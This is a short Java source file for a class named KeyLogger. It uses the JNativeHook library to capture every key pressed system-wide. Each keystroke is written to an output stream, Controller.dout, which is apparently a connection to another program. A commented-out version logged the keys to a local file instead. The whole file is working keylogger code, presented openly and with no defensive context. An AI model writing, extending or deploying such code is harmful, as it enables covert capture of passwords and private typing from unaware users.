package com.example.demo1;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

public class KeyLogger implements NativeKeyListener {

    //public static final Path file = Paths.get("D://keys.txt");
    public static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

    public static void init() {

        // Get the logger for "org.jnativehook" and set the level to warning.
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {

        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        /*try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer=new PrintWriter(os);) */
        try {
            if (keyText.length() > 1) {
                Controller.dout.writeUTF("[" + keyText + "]");
            } else {
                Controller.dout.writeUTF(keyText);
            }

        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Nothing
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }
}

